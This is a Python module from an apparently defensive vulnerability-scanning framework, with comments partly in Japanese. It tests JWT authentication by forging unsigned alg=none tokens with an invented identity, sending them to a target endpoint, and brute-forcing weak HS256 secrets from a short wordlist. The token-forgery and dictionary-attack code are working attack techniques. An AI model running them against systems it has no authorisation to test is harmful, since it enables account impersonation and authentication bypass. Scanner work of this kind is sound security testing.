"""
AuthNinja: High-speed Authentication Checker

Specialist for fast, rule-based authentication checks.
"""
import base64
import json
import logging
import time
import uuid
import jwt
from typing import List, Dict, Any, Optional, Tuple
from urllib.parse import urlparse

from src.core.agents.swarm.base import Specialist, Task
from src.core.models.finding import Finding, VulnType, Severity, Evidence

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# JWT alg=none forgery helpers (SGK-2026-0476)
#
# The engine fabricates its OWN unsigned token carrying an attacker-chosen
# identity. It NEVER replicates a captured real token (a replayed stolen
# session would prove nothing about unsigned-forgery acceptance) and never
# logs token/secret values.
# ---------------------------------------------------------------------------

_REQUEST_TIMEOUT_SECONDS = 20
_EVIDENCE_BODY_EXCERPT_LIMIT = 2000
_FORGED_IDENTITY_TEMPLATE = "forge-{nonce}@evil.example"


def _b64url_nopad(data: bytes) -> str:
    """URL-safe base64 without padding (JWT segment encoding)."""
    return base64.urlsafe_b64encode(data).decode("ascii").rstrip("=")


def _fabricate_forged_identity() -> str:
    """攻撃者選択の fabricate identity（実トークン由来ではない・example 系）。"""
    return _FORGED_IDENTITY_TEMPLATE.format(nonce=uuid.uuid4().hex[:8])


def _fabricate_none_alg_token(forged_identity: str, user_id: int = 1) -> str:
    """alg=none 無署名偽造トークンをローカル生成する（署名空・攻撃者選択値のみ）。

    header ``{"typ": "JWT", "alg": "none"}``・payload ``{"data": {"id",
    "email"}, "iat"}``・署名は空文字。実トークンの複製は一切含まない。
    """
    header = {"typ": "JWT", "alg": "none"}
    payload = {
        "data": {"id": user_id, "email": forged_identity},
        "iat": int(time.time()),
    }
    header_segment = _b64url_nopad(
        json.dumps(header, separators=(",", ":")).encode("utf-8")
    )
    payload_segment = _b64url_nopad(
        json.dumps(payload, separators=(",", ":")).encode("utf-8")
    )
    return f"{header_segment}.{payload_segment}."


def _response_text(resp: Any) -> str:
    """Project a response-like object to str body (bytes decoded safely)."""
    body = getattr(resp, "body", None)
    if body is None:
        body = getattr(resp, "text", "") or ""
    if isinstance(body, bytes):
        body = body.decode("utf-8", errors="replace")
    return str(body or "")


def _excerpt(text: str, limit: int) -> str:
    """応答本文の抜粋（limit 文字で打ち切り・証拠用）。"""
    text = str(text or "")
    return text if len(text) <= limit else text[:limit]


async def _send_identity_get(
    client: Any, url: str, *, headers: Dict[str, str]
) -> Tuple[str, int]:
    """ONE GET through the injected/created client (GET-only probe).

    ``allow_redirects=False``: a 3xx (e.g. redirect to login) never counts as
    an accepted forged identity (fail-closed). Returns ``(body, status)``.
    """
    resp = await client.request(
        "GET",
        url,
        headers=headers or None,
        timeout=_REQUEST_TIMEOUT_SECONDS,
        allow_redirects=False,
        use_cache=False,
    )
    return _response_text(resp), int(getattr(resp, "status", 0) or 0)


class AuthNinja(Specialist):
    """
    高速認証チェッカー
    
    機能:
    1. JWT None Algorithm Attack
    2. Weak Secret Brute-force (Dictionary attack on JWT signature)
    3. Basic Auth Weak Credentials (if applicable)
    """
    
    name = "AuthNinja"
    description = "Fast checker for common auth weaknesses (JWT None-Alg, Weak Secrets)."
    
    def __init__(self, config: Optional[Dict[str, Any]] = None):
        super().__init__(config)
        self.wordlist = ["secret", "123456", "password", "admin", "test"] # 簡易辞書

    async def execute(self, task: Task) -> List[Finding]:
        """Entry point"""
        token = task.params.get("token", "")
        if not token:
            return []

        auth_endpoint = str(
            task.params.get("auth_endpoint") or task.target or ""
        ).strip()
        result = await self.run_as_tool(token, "all", auth_endpoint=auth_endpoint)

        findings = []
        if result.get("vulnerable"):
            if str(result.get("vuln_type") or "") == VulnType.JWT_ALG_NONE.value:
                # SGK-2026-0476: alg=none 偽造受理（サーバ側実確証あり）の本物 Finding。
                findings.append(
                    self._build_jwt_alg_none_finding(task, result, auth_endpoint)
                )
            else:
                # 既存経路（weak-secret 等）は従来どおりの Finding 構成を維持。
                findings.append(Finding(
                    vuln_type=VulnType.JWT_NONE_ALG if "None Alg" in result["description"] else VulnType.WEAK_PASSWORD,
                    severity=Severity.HIGH,
                    title=f"Authentication Bypass: {result['description']}",
                    description=result["description"],
                    target_url=task.target,
                    source_agent=self.name,
                    evidence=Evidence(
                        request_url=task.target,
                        response_body=result.get("evidence", "")
                    )
                ))
        return findings

    def _build_jwt_alg_none_finding(
        self, task: Task, result: Dict[str, Any], auth_endpoint: str
    ) -> Finding:
        """alg=none 偽造受理の Finding（impact / reproduction_steps /
        additional_info / evidence 完備・SGK-2026-0476）。"""
        info = result.get("additional_info")
        return Finding(
            vuln_type=VulnType.JWT_ALG_NONE,
            severity=Severity.HIGH,
            title=f"Authentication Bypass: {result['description']}",
            description=result["description"],
            target_url=task.target,
            source_agent=self.name,
            evidence=Evidence(
                request_method="GET",
                request_url=auth_endpoint,
                response_status=int(result.get("response_status") or 0),
                response_body=str(result.get("response_body") or ""),
            ),
            impact=str(result.get("impact") or ""),
            reproduction_steps=list(result.get("reproduction_steps") or []),
            additional_info=info if isinstance(info, dict) else {},
        )

    async def run_as_tool(self, token: str, check_type: str = "all", **_kwargs) -> Dict[str, Any]:
        """
        Managerから呼び出し可能なToolメソッド

        認証 identity 反映エンドポイント（``auth_endpoint`` kwarg）が渡された
        場合のみ、alg=none 偽造トークンのサーバ受理を GET で実確証する
        （SGK-2026-0476）。エンドポイント無し＝ローカル解析のみ（従来挙動・
        fail-closed・ネットワーク送信なし）。
        """
        if not token or token.count('.') != 2:
            return {
                "vulnerable": False, 
                "message": f"Skipped: Token does not appear to be a JWT (Found: '{token[:20]}...'). AuthNinja currently only supports JWT analysis. Opaque session cookies are not yet supported."
            }
             
        # 1. None Algorithm Check（エンドポイントがあればサーバ側受理を実確証）
        if check_type in ["all", "none_alg"]:
            result = await self._check_none_alg(
                token, auth_endpoint=str(_kwargs.get("auth_endpoint") or "").strip()
            )
            if result.get("vulnerable"):
                return result

        # 2. Weak Secret Check
        if check_type in ["all", "weak_secret"]:
            is_vuln, secret = self._check_weak_secret(token)
            if is_vuln:
                return {
                    "vulnerable": True,
                    "description": f"JWT signed with weak secret: '{secret}'",
                    "evidence": f"Secret: {secret}",
                    "strategy": "Brute-force verification with common dictionary."
                }
                
        return {"vulnerable": False, "message": "No vulnerabilities found by AuthNinja"}

    async def _check_none_alg(self, token: str, auth_endpoint: str = "") -> Dict[str, Any]:
        """
        Alg: None 攻撃のサーバ側受理の実確証 (SGK-2026-0476)。

        認証 identity を反映するエンドポイント（auth_endpoint）に対し:
        1. baseline: トークン無しで GET し、fabricate identity が本文に
           「不在」である基準を観測する。
        2. forged: エンジンが fabricate した identity（実トークンの複製では
           ない攻撃者選択値）を載せた無署名（alg=none・署名空）トークンを
           ``Authorization: Bearer`` と ``Cookie: token=`` に付けて同一
           エンドポイントへ GET する。

        差分成立（baseline 不在 → forged で identity 反映）のときだけ
        vulnerable=True。401/拒否/非反映/差分なし/送信不能/エンドポイント
        不在は False（fail-closed）。baseline も attack も GET のみ。
        トークン・秘密の値はログに出さない（forged_token は fabricated
        identity のみを含む・evidence 用に finding 側へ渡す）。
        """
        endpoint = auth_endpoint
        if not endpoint:
            # サーバ検証先が無い → ネットワーク送信しない（従来のローカル挙動）
            return {"vulnerable": False}
        try:
            parsed = urlparse(endpoint)
        except ValueError:
            return {"vulnerable": False}
        if parsed.scheme not in {"http", "https"} or not parsed.netloc:
            return {"vulnerable": False}

        forged_identity = _fabricate_forged_identity()
        forged_token = _fabricate_none_alg_token(forged_identity)

        client, created = await self._acquire_network_client()
        if client is None:
            return {"vulnerable": False}
        try:
            baseline_body, baseline_status = await _send_identity_get(
                client, endpoint, headers={}
            )
            forged_body, forged_status = await _send_identity_get(
                client,
                endpoint,
                headers={
                    "Authorization": f"Bearer {forged_token}",
                    "Cookie": f"token={forged_token}",
                },
            )
        except Exception as exc:  # noqa: BLE001 — network boundary, fail closed
            logger.warning(
                "[%s] alg=none acceptance probe failed: %s",
                self.name,
                type(exc).__name__,
            )
            return {"vulnerable": False}
        finally:
            if created:
                try:
                    await client.close()
                except Exception:  # noqa: BLE001 — client close boundary
                    pass

        # fail-closed: 実応答が無い/異常は受理と判定しない
        if baseline_status <= 0 or forged_status <= 0 or not forged_body:
            return {"vulnerable": False}
        # 差分: forged で fabricate identity が反映 かつ baseline では不在
        reflected = forged_identity in forged_body
        baseline_absent = forged_identity not in baseline_body
        if not reflected or not baseline_absent:
            return {"vulnerable": False}

        return {
            "vulnerable": True,
            "description": "JWT accepts 'none' algorithm (Signature Bypass)",
            "evidence": _excerpt(forged_body, _EVIDENCE_BODY_EXCERPT_LIMIT),
            "strategy": (
                "Fabricated a local alg=none token (empty signature) with an "
                "attacker-chosen identity and sent it; the server accepted it "
                "without signature verification."
            ),
            "vuln_type": VulnType.JWT_ALG_NONE.value,
            "impact": (
                "The server accepts unsigned (alg=none) JWT tokens without "
                "signature verification: an attacker holding no secret can "
                "impersonate an arbitrary identity chosen at forging time. The "
                "forged identity is reflected by the endpoint while a token-less "
                "request yields no identity (differential proof) — a full "
                "authentication bypass for endpoints trusting these tokens."
            ),
            "reproduction_steps": [
                "1. Send a GET request to the identity endpoint without any token "
                "and record the response (the forged identity is absent).",
                "2. Locally fabricate a JWT with header "
                '{"typ":"JWT","alg":"none"} and an empty signature, carrying the '
                "attacker-chosen identity (no captured token is replayed).",
                "3. Send a GET request to the same endpoint with "
                "'Authorization: Bearer <forged>' and 'Cookie: token=<forged>'.",
                "4. Observe the fabricated identity reflected in the response body "
                "while it was absent without a token: the server accepted the "
                "unsigned forgery.",
            ],
            "additional_info": {
                "forged_identity": forged_identity,
                "forged_identity_reflected": True,
                "auth_endpoint": endpoint,
                "forged_token": forged_token,
                "unauth_baseline_absent": True,
                "jwt_alg": "none",
            },
            "response_status": forged_status,
            "response_body": _excerpt(forged_body, _EVIDENCE_BODY_EXCERPT_LIMIT),
        }

    async def _acquire_network_client(self) -> Tuple[Any, bool]:
        """注入済み client が優先。無ければ AuthManager と同じ自己完結パターンで
        AsyncNetworkClient を生成する（生成失敗は fail-closed で None）。"""
        if self.network_client is not None:
            return self.network_client, False
        try:
            from src.core.infra.network_client import AsyncNetworkClient
            from src.core.config.settings import resolve_run_mode
            return AsyncNetworkClient(mode=resolve_run_mode()), True
        except Exception:  # noqa: BLE001 — client bootstrap boundary, fail closed
            return None, False

    def _check_weak_secret(self, token: str) -> Tuple[bool, str]:
        """
        辞書攻撃による署名検証
        """
        try:
            for secret in self.wordlist:
                try:
                    jwt.decode(token, secret, algorithms=["HS256"])
                    return True, secret
                except jwt.InvalidSignatureError:
                    continue
                except Exception:
                    continue
        except Exception:
            pass
        return False, ""
